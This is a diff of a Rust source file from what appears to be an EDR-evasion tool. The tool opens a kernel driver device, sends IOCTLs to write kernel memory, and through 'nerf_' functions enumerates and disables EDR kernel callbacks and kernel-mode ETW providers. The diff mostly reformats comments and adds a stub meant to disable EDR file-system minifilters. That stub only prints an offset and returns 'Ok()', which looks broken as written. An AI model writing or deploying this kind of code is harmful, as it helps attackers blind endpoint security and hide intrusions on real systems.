@@ -14,9 +14,10 @@ use winapi::um::ioapiset::DeviceIoControl;
 
 use crate::mem::{self, write_qword};
 use crate::km;
+use crate::pdb;
 
 
-// Opens a handle to the device and returns it
+/// Opens a handle to the device and returns it
 pub fn get_driver_handle() -> Result<HANDLE, u32> {
     let cstr_device_name =
         CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");
@@ -42,7 +43,8 @@ pub fn get_driver_handle() -> Result<HANDLE, u32> {
     }
 }
 
-// Sends an IOCTL to the driver
+
+/// Sends an IOCTL to the driver
 pub unsafe fn send_ioctl_to_driver(
     h_device: HANDLE,
     location_to_write_to: u64,
@@ -81,7 +83,8 @@ pub unsafe fn send_ioctl_to_driver(
     success
 }
 
-// Read & disable EDR callbacks
+
+/// Read & disable EDR callbacks
 pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u64>> {
     println!("[>] Enumerating {} callback at: 0x{:16X}", cb_type, base_address);
 
@@ -122,7 +125,8 @@ pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u6
     Ok(result)
 }
 
-// Read & disable a km ETW provider
+
+/// Read & disable a km ETW provider
 pub fn nerf_etw_prov(
     prov_addr: u64, prov_name: &str, guid_offset: u64, prov_offset: u64
 ) -> windows::core::Result<u64> {
@@ -143,3 +147,24 @@ pub fn nerf_etw_prov(
     Ok(enable_info as u64) // wrap the success in Ok()
 }
 
+
+/// Read & disable an EDR file system minifilter
+/// pub struct FmOffsets {
+///     pub flt_globals: u64,
+///     pub globals_framelist: u64,
+///     pub flt_resource_list_head_rlist: u64,
+///     pub fltp_frame_links: u64,
+///     pub fltp_frame_registeredfilters: u64,
+///     pub flt_object_primarylink: u64,
+///     pub flt_filter_driverobject: u64,
+///     pub flt_filter_instancelist: u64,
+///     pub driver_object_driverinit: u64,
+///     pub flt_instance_callbacknodes: u64,
+///     pub flt_instance_filterlink: u64
+/// }  
+///
+pub fn nerf_fs_miniflts(fm_offsets: pdb::FmOffsets) -> windows::core::Result<u64> {
+    println!("[|] FltGlobals offset: 0x{:x}", fm_offsets.flt_globals);
+    
+    Ok()
+}
